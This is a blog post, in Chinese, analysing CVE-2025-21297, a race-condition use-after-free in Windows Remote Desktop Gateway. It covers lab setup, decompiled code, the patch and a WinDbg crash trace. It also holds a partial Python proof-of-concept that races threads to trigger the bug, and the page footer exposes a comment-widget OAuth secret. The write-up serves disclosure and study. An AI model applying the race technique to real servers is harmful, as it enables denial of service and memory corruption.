<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Windows Remote Desktop Gateway (RD Gateway) CVE-2025-21297的介绍 · VictorV的小博客</title><meta name="description" content="Windows Remote Desktop Gateway (RD Gateway) CVE-2025-21297的介绍 - VictorV"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://474172261.github.io/atom.xml" title="VictorV的小博客"><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="VictorV的小博客" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/images/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://twitter.com/vv474172261" target="_blank" class="nav-list-link">TWITTER</a></li><li class="nav-list-item"><a href="https://github.com/474172261" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Windows Remote Desktop Gateway (RD Gateway) CVE-2025-21297的介绍</h1><div class="post-info">2025年5月15日</div><div class="post-content"><p>时隔多月, 也是时候分享一个RDG的案例了. 这是一个全局变量初始化竞争导致的UAF问题. 在azure的挖掘中, 我渐渐熟悉了在开源软件里发现竞争性漏洞的感觉, 在这个case里, 我在binary程序中也找到了发现竞争漏洞的感觉.</p>
<span id="more"></span>

<h2 id="配置RDG环境"><a href="#配置RDG环境" class="headerlink" title="配置RDG环境"></a>配置RDG环境</h2><ol>
<li><p>准备虚拟机, 安装未修补漏洞的windows server.</p>
</li>
<li><p>安装 RDG 服务</p>
<p><img src="/images/CVE-2025-21297.assets/1724930738398.png" alt="1724930738398"></p>
<p><img src="/images/CVE-2025-21297.assets/1724930805655.png" alt="1724930805655"></p>
<p><img src="/images/CVE-2025-21297.assets/1724930817254.png" alt="1724930817254"></p>
<p><img src="/images/CVE-2025-21297.assets/1724930838256.png" alt="1724930838256"></p>
<p><img src="/images/CVE-2025-21297.assets/1724930853119.png" alt="1724930853119"></p>
<p><img src="/images/CVE-2025-21297.assets/1724930861724.png" alt="1724930861724"></p>
<p><img src="/images/CVE-2025-21297.assets/1724930874111.png" alt="1724930874111"></p>
<p><img src="/images/CVE-2025-21297.assets/1724930908758.png" alt="1724930908758"></p>
<p>wait until finish installation:</p>
<p><img src="/images/CVE-2025-21297.assets/1724931393509.png" alt="1724931393509"></p>
<p>select tools to open RDG manager:</p>
<p><img src="/images/CVE-2025-21297.assets/1724931430677.png" alt="1724931430677"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931458368.png" alt="1724931458368"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931477527.png" alt="1724931477527"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931503035.png" alt="1724931503035"></p>
<p>创建自签名证书:</p>
<p><img src="/images/CVE-2025-21297.assets/1724931563124.png" alt="1724931563124"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931624086.png" alt="1724931624086"></p>
<p>最后点击”OK”:</p>
<p><img src="/images/CVE-2025-21297.assets/1724931681229.png" alt="1724931681229"></p>
<p>创建 RDCAP:</p>
<p><img src="/images/CVE-2025-21297.assets/1724931754262.png" alt="1724931754262"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931772188.png" alt="1724931772188"></p>
<p>选择用户组:</p>
<p><img src="/images/CVE-2025-21297.assets/1724931808867.png" alt="1724931808867"></p>
<p>点击 “OK”.</p>
<p><img src="/images/CVE-2025-21297.assets/1724931976253.png" alt="1724931976253"></p>
<p>创建 RDRAP:</p>
<p><img src="/images/CVE-2025-21297.assets/1724931877871.png" alt="1724931877871"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931894166.png" alt="1724931894166"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931916078.png" alt="1724931916078"></p>
<p><img src="/images/CVE-2025-21297.assets/1724931946012.png" alt="1724931946012"></p>
<p>点击”OK”.</p>
<p><img src="/images/CVE-2025-21297.assets/1724931995221.png" alt="1724931995221"></p>
</li>
</ol>
<p><strong>获取进程id:</strong></p>
<p><img src="/images/CVE-2025-21297.assets/1726633951979.png"></p>
<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>在<code>aaedge.dll!CTsgMsgServer::GetCTsgMsgServerInstance</code>里, 会初始化全局变量<code>CTsgMsgServer::m_pMsgSvrInstance</code>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">CTsgMsgServer</span> *CTsgMsgServer::<span class="built_in">GetCTsgMsgServerInstance</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  v0 = CTsgMsgServer::m_pMsgSvrInstance;</span><br><span class="line">  <span class="keyword">if</span> ( CTsgMsgServer::m_pMsgSvrInstance )<span class="comment">// a0</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  v1 = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x70</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1-&gt;ref = <span class="number">1</span>;</span><br><span class="line">    CTsgMsgServer::m_pMsgSvrInstance = v1; <span class="comment">// a1</span></span><br><span class="line">    ......</span><br><span class="line">    v0 = CTsgMsgServer::m_pMsgSvrInstance;</span><br><span class="line">LABEL_9:</span><br><span class="line">    v4 = (v0 + *(v0-&gt;_0_60h_0h + <span class="number">4</span>i64));</span><br><span class="line">    (v4-&gt;f_0h-&gt;func_AddRef_CAAAuthenticateUserSink_180006ce0_0h)(v4);</span><br><span class="line">    <span class="keyword">return</span> CTsgMsgServer::m_pMsgSvrInstance;<span class="comment">// a2</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如上所示, 在a1位置, 设置了指针给<code>CTsgMsgServer::m_pMsgSvrInstance</code>, 在a2位置, 返回值用的是全局变量<code>CTsgMsgServer::m_pMsgSvrInstance</code>.</p>
<p>现在设想一个如下场景:</p>
<ol>
<li>socket1连接服务, 进入了该函数a0位置, 由于<code>CTsgMsgServer::m_pMsgSvrInstance</code>没有初始化, 所以进入到申请内存阶段, 此时还没有到达a1.</li>
<li>socket2同时连接服务, 进入了该函数, 由于socket1的流程还没有到a1, 所以<code>CTsgMsgServer::m_pMsgSvrInstance</code>还是没有初始化, 因此也进入申请内存阶段.</li>
<li>socket1运行至a1位置, 将heap1赋值给全局变量. 之后运行至a2位置, 准备通过全局变量返回heap1指针.</li>
<li>socket2运行至a1位置, 用heap2覆盖了<code>CTsgMsgServer::m_pMsgSvrInstance</code>存储的heap1的值. heap2-&gt;ref 是 1.</li>
<li>socket1运行结束, 将heap2作为结果返回, 并且heap2-&gt;ref 还是1.</li>
<li>socket2运行到a2, 返回heap2. 此时heap2-&gt;ref 是2.</li>
<li>socket1结束时, 解引用<code>CTsgMsgServer::m_pMsgSvrInstance</code>, heap2-&gt;ref变成1</li>
<li>socket2结束时, 解引用<code>CTsgMsgServer::m_pMsgSvrInstance</code>, heap2-&gt;ref变成0, heap2被释放. <code>CTsgMsgServer::m_pMsgSvrInstance</code>变成悬挂指针.</li>
<li>当socket3连接时, 引用了悬挂指针, 导致UAF</li>
</ol>
<p>这个全局变量只会初始化一次, 所以只有在服务第一次启动的时候是NULL的, 但是我们可以通过其它漏洞崩溃服务进程, 让它重启, 于是它又是NULL了.</p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>官方添加了互斥锁, 避免了多线程同时进入初始化流程.</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这个uaf最大的问题在于返回值用的全局变量指针, 如果是临时变量指针v1, 至少不会导致引用计数错误. 同时, 也提醒我们要关注全局变量的初始化和引用, 避免竞争情况下的异常.</p>
<h2 id="POC核心逻辑"><a href="#POC核心逻辑" class="headerlink" title="POC核心逻辑"></a>POC核心逻辑</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">conId</span>):</span><br><span class="line">  data = <span class="string">&#x27;GET /remoteDesktopGateway?......&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_logic</span>():</span><br><span class="line">  sock.send(get_data(conId).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  sock.recv(<span class="number">1024</span>)</span><br><span class="line">  time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">  data = HandShakeRequest(<span class="number">0</span>)</span><br><span class="line">  data = websocket_data(<span class="string">b&#x27;xxxx&#x27;</span>, data)</span><br><span class="line">  sock.send(data)</span><br><span class="line">  sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">  data = TunnelRequest(<span class="number">2</span>)</span><br><span class="line">  data = websocket_data(<span class="string">b&#x27;xxxx&#x27;</span>, data)</span><br><span class="line">  wait_all_threads_ready_and_sync()</span><br><span class="line">  sock.send(data)</span><br><span class="line">  time.sleep(<span class="number">0.1</span>)</span><br><span class="line">  sock.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(total_thread_nums):</span><br><span class="line">    pool.submit(main_logic) // 使用多个线程竞争</span><br><span class="line">  time.sleep(<span class="number">0.5</span>)</span><br><span class="line">  main_logic()// 模拟socket3行为</span><br></pre></td></tr></table></figure>

<h2 id="crash栈回溯"><a href="#crash栈回溯" class="headerlink" title="crash栈回溯"></a>crash栈回溯</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">0:046&gt; r</span><br><span class="line">rax=0000000000000000 rbx=0000000000000000 rcx=000001aa4c74e7c0</span><br><span class="line">rdx=000001aa4bfb4f90 rsi=000001aa4c74e7c0 rdi=000001aa4d2a0650</span><br><span class="line">rip=00007ffa77957678 rsp=0000003a539fef60 rbp=0000000000000000</span><br><span class="line"> r8=7ffffffffffffffc  r9=0000000000000000 r10=00000fff4ef319d4</span><br><span class="line">r11=0000000004500000 r12=0000000000000001 r13=00007ffa779ce1c8</span><br><span class="line">r14=000001aa4c74e7c0 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</span><br><span class="line">aaedge!CTsgMsgServer::GetCTsgMsgServerInstance+0xf8:</span><br><span class="line">00007ffa`77957678 488b02          mov     rax,qword ptr [rdx] ds:000001aa`4bfb4f90=????????????????</span><br><span class="line">0:046&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 0000003a`539fef60 00007ffa`77952007 aaedge!CTsgMsgServer::GetCTsgMsgServerInstance+0xf8</span><br><span class="line">01 0000003a`539fefa0 00007ffa`779528de aaedge!CServerTunnel::Initialize+0x57</span><br><span class="line">02 0000003a`539ff030 00007ffa`7795cc20 aaedge!CAAServerTunnelFactory::InternalCreateNewTunnel+0x23a</span><br><span class="line">03 0000003a`539ff0a0 00007ffa`7795c776 aaedge!CEdgeOperations::CreateTunnelWithUser+0x30</span><br><span class="line">04 0000003a`539ff0e0 00007ffa`7799038a aaedge!CEdgeOperations::CreateTunnel+0x1d6</span><br><span class="line">05 0000003a`539ff190 00007ffa`779929c9 aaedge!CAAHttpServerConnection::HandleTunnelRequestReceived+0x262</span><br><span class="line">06 0000003a`539ff230 00007ffa`77989816 aaedge!CAAHttpServerConnection::OnReceiveDataComplete+0x1c9</span><br><span class="line">07 0000003a`539ff4d0 00007ffa`7797d5c2 aaedge!CAAHttpServerTransport::WebSocketReceiveLoop+0x104e</span><br><span class="line">08 0000003a`539ff640 00007ffa`7797e286 aaedge!CAAHttpServerTransport::HandleWebSocketReceiveRawDataCompletion+0x24e</span><br><span class="line">09 0000003a`539ff6d0 00007ffa`94407c4f aaedge!CAAHttpServerTransport::IoCompletionCallback+0x266</span><br><span class="line">0a 0000003a`539ff760 00007ffa`95a18e57 kernel32!BasepTpIoCallback+0x4f</span><br><span class="line">0b 0000003a`539ff7b0 00007ffa`95a31f9e ntdll!TppIopExecuteCallback+0x1b7</span><br><span class="line">0c 0000003a`539ff830 00007ffa`9440dbe7 ntdll!TppWorkerThread+0x57e</span><br><span class="line">0d 0000003a`539ffb90 00007ffa`95a65a4c kernel32!BaseThreadInitThunk+0x17</span><br><span class="line">0e 0000003a`539ffbc0 00000000`00000000 ntdll!RtlUserThreadStart+0x2c</span><br><span class="line">0:046&gt; !heap -p -a 1aa`4bfb4f90</span><br><span class="line">ReadMemory error for address ffffffffffffffe8</span><br><span class="line">Use `!address ffffffffffffffe8&#x27; to check validity of the address.</span><br><span class="line">ReadMemory error for address ffffffffffffffe8</span><br><span class="line">Use `!address ffffffffffffffe8&#x27; to check validity of the address.</span><br><span class="line">    address 000001aa4bfb4f90 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1aa40001000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                1aa400465b0:      1aa4bfb4000             2000</span><br><span class="line">    00007ffa95a64373 ntdll!RtlDebugFreeHeap+0x0000000000000037</span><br><span class="line">    00007ffa95a0ba6e ntdll!RtlpFreeHeap+0x000000000000174e</span><br><span class="line">    00007ffa95a09b80 ntdll!RtlpFreeNTHeapInternal+0x00000000000003f0</span><br><span class="line">    00007ffa95a13414 ntdll!RtlpHpTagFreeHeap+0x0000000000000574</span><br><span class="line">    00007ffa95a123bd ntdll!RtlFreeHeap+0x000000000000019d</span><br><span class="line">    00007ffa94d7d61c msvcrt!free+0x000000000000001c</span><br><span class="line">    00007ffa77956fd4 aaedge!CTsgMsgServer::`vector deleting destructor&#x27;+0x0000000000000034</span><br><span class="line">    00007ffa77909537 aaedge!CAABase::Release+0x0000000000000027</span><br><span class="line">    00007ffa7794fba2 aaedge!CServerTunnel::~CServerTunnel+0x00000000000000ce</span><br><span class="line">    00007ffa7794fd90 aaedge!CServerTunnel::`vector deleting destructor&#x27;+0x0000000000000020</span><br><span class="line">    00007ffa77909537 aaedge!CAABase::Release+0x0000000000000027</span><br><span class="line">    00007ffa7798c816 aaedge!CAAHttpServerConnection::Cleanup+0x000000000000026e</span><br><span class="line">    00007ffa779911ca aaedge!CAAHttpServerConnection::InternalShutdown+0x0000000000000486</span><br><span class="line">    00007ffa77992768 aaedge!CAAHttpServerConnection::OnDisconnected+0x00000000000000b8</span><br><span class="line">    00007ffa7797c03c aaedge!CAAHttpServerTransport::HandleDisconnected+0x00000000000003b0</span><br><span class="line">    00007ffa7797e250 aaedge!CAAHttpServerTransport::IoCompletionCallback+0x0000000000000230</span><br><span class="line">    00007ffa94407c4f kernel32!BasepTpIoCallback+0x000000000000004f</span><br><span class="line">    00007ffa95a18e57 ntdll!TppIopExecuteCallback+0x00000000000001b7</span><br><span class="line">    00007ffa95a31f9e ntdll!TppWorkerThread+0x000000000000057e</span><br><span class="line">    00007ffa9440dbe7 kernel32!BaseThreadInitThunk+0x0000000000000017</span><br><span class="line">    00007ffa95a65a4c ntdll!RtlUserThreadStart+0x000000000000002c</span><br></pre></td></tr></table></figure>

</div></article></div></main><footer><div class="paginator"><a href="/2025/08/20/test-promt/" class="prev">PREV</a><a href="/2025/02/18/Azure-bounty-program-research/" class="next">NEXT</a></div><div id="container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script><div id="gitalk-container"></div><script>const gitalk = new Gitalk({
    clientID: '28b1a73c3ed656a9a85d',     
    clientSecret: '59837bb4cbe7b2f12df366fdbcb37fa4ba084d44',     
    id: 'Thu May 15 2025 11:39:12 GMT+0800',    
    repo: 'blog-comment',     
    owner: '474172261',     
    admin: '474172261',     
})   
gitalk.render('gitalk-container')</script><div class="copyright"><p>© 2015 - 2025 <a href="http://474172261.github.io">VictorV</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>